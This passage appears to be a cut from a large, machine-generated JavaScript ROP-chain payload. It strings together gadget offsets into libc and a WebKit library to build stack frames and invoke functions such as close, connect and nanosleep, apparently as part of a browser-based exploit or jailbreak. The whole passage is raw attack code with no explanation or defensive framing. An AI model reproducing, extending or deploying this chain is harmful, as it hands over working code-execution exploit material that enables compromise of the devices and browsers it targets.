db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+182592, //L2887
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+182608, //L2888
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2887:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2888:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+182760, //L2890
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+182792, //L2893
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+182776, //L2891
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+182744, //L2892
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2892:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2890:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2891:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2893:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+182888, //L2895
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+182872, //L2894
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2894:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2895:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2897:
ropchain+182992, //L2896
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+183640, //L2898
//L2896:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+183064, //L2899
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2899:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2900:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2901:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+183192, //L2902
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+183208, //L2903
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2902:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2903:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+183320, //L2904
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+183304, //L2905
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2905:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2904:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+183408, //L2907
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+183392, //L2906
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2906:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2907:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+183504, //L2908
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+183520, //L2909
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2908:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2909:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+183632, //L2910
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+183616, //L2911
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2911:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2910:
db([0, 0]); // 0x0
//L2898:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
close_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+184960, //L2912
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2912:
db([0, 0]); // 0x0
//L2701:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
connect_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+186288, //L2913
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2913:
db([0, 0]); // 0x0
//L2636:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
nanosleep_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+187616, //L2914
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2914:
db([0, 0]); // 0x0
//L2784:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
